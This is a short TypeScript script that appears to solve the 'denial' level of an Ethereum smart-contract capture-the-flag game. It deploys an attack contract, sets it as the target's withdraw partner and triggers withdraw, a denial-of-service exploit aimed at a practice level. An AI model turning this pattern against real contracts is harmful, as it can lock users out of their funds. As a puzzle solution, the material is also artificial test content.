// Runtime Environment's members available in the global scope.
import { ethers } from 'ethers';
import { BigNumber, Signer, BytesLike } from "ethers";
import { getSigner } from "./signer";
import { DenialAttack__factory, Denial__factory } from "../typechain";
import { createLevel, submitLevel } from './utils';

async function main() {
  const signer = getSigner();
  const level =await createLevel(signer,"denial")

  const denial = await (new DenialAttack__factory(signer)).deploy(level);
  const target = Denial__factory.connect(level, signer);

  await (await target.setWithdrawPartner(denial.address)).wait();
  await target.withdraw({ gasLimit: 1000000 });
  await submitLevel(signer,level)
}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
